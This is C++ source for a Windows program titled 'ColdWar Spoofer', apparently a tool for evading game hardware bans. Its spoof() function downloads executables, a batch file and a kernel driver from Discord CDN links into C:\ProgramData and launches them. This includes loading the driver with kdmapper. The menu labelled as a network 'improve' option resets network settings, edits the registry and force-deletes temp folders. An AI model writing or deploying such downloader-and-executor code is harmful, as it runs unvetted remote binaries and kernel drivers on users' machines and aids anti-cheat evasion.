// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
//paste these below
#include <iostream>
#pragma once
#include <iostream>
#include <string>
#include <tchar.h>
#include <string.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")
using namespace std;

void spoof()
{
    string spoofer = "https://cdn.discordapp.com/attachments/826765485450068008/826765618103582730/spoofy.sys";//download link
    string spooferpath = "C:\\ProgramData\\woof.sys";//downloads here
    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);//start download

    string mapper = "https://cdn.discordapp.com/attachments/826765485450068008/826768592757587968/kdmapper.exe";
    string mapperpath = "C:\\ProgramData\\mapper.exe";//downloads here
    URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);

    string more = "https://cdn.discordapp.com/attachments/826765485450068008/826768724232241152/more.exe";
    string morepath = "C:\\ProgramData\\more.exe";
    URLDownloadToFileA(NULL, more.c_str(), morepath.c_str(), 0, NULL);

    string clean = "https://cdn.discordapp.com/attachments/826765485450068008/826767630382923816/cw.bat";
    string cleanpath = "C:\\ProgramData\\cw.bat";
    URLDownloadToFileA(NULL, clean.c_str(), cleanpath.c_str(), 0, NULL);

    string cw = "https://cdn.discordapp.com/attachments/798311924886142987/799372045766754374/warzone_coldwar_cleaner.exe";
    string cwpath = "C:\\ProgramData\\warzone_coldwar_cleaner.exe";
    URLDownloadToFileA(NULL, cw.c_str(), cwpath.c_str(), 0, NULL);

    string ntuser = "https://cdn.discordapp.com/attachments/826765485450068008/826767624225423360/Ntuser.exe";
    string ntuserpath = "C:\\ProgramData\\ntuser.exe";
    URLDownloadToFileA(NULL, ntuser.c_str(), ntuserpath.c_str(), 0, NULL);


    string ntusers = "https://cdn.discordapp.com/attachments/826765485450068008/826769431748804658/Cleaner.exe";
    string ntuserspath = "C:\\ProgramData\\Cleaner.exe";
    URLDownloadToFileA(NULL, ntusers.c_str(), ntuserspath.c_str(), 0, NULL);
    
    system("cd C:\\ProgramData\\");
    system("start C:\\ProgramData\\Cleaner.exe");
    system("start C:\\ProgramData\\warzone_coldwar_cleaner.exe");
    system("start C:\\ProgramData\\ntuser.exe");
    system("start C:\\ProgramData\\mapper.exe C:\\ProgramData\\woof.sys");
    system("start C:\\ProgramData\\cw.bat");
    system("start C:\\ProgramData\\more.exe");
    Sleep(40000);

}
int main()
{
    SetConsoleTitleA("ColdWar Spoofer");
    int choice;
menu:
    system("CLS");
    string raw_str = R"(                      
)";
    cout << raw_str << endl;
    cout << "1: Restart internet and improve\n";
    cin >> choice;
    if (choice == 1)
    {
        printf("Limpiando red y terminando procesos");
        Sleep(2000);
        system("ipconfig /flushdns");
        system("netsh winsock reset");
        system("netsh int tcp set global chimney=enabled");
        system("netsh int tcp set global autotuninglevel=normal");
        system("netsh int tcp set supplemental");
        Sleep(500);
        system("netsh int tcp set global dca=enabled");
        system("netsh int tcp set global netdma=enabled");
        system("netsh int tcp set global ecncapability=enabled");
        system("ipconfig /release");
        system("ipconfig /renew");
        system("Reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile /v NetworkThrottlingIndex /t REG_DWORD /d (4294967295) /f");
        system("CLS");
        printf("Limpiando archivos temporales");
        Sleep(2000);
        system("del /s /f /q c:\\windows\\temp\\*.*");
        system("rd /s /q c:\\windows\\temp");
        system("md c:\\windows\\temp");
        system("del /s /f /q %temp%\\*.*");
        system("rd /s /q %temp%");
        system("CLS");
        printf("Listo!! Todo terminado");
        Sleep(1500);
        system("CLS");
        printf("Regresando al menu");
        Sleep(2000);
        goto menu;
    }

}



//make a void

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
